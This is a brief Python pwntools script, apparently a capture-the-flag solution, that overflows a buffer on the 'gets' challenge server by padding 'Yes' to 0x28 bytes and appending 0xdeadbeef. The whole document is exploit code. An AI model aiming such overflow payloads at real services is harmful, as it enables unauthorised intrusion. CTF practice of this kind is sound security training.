from pwn import *

print(p32(0xdeadbeef))
print(p64(0xdeadbeef))

r = remote("gets.litctf.live", 1337)

payload = b"Yes".ljust(0x28, b"\x00") + p32(0xdeadbeef)

r.sendline(payload)
print(r.recvall().decode().strip())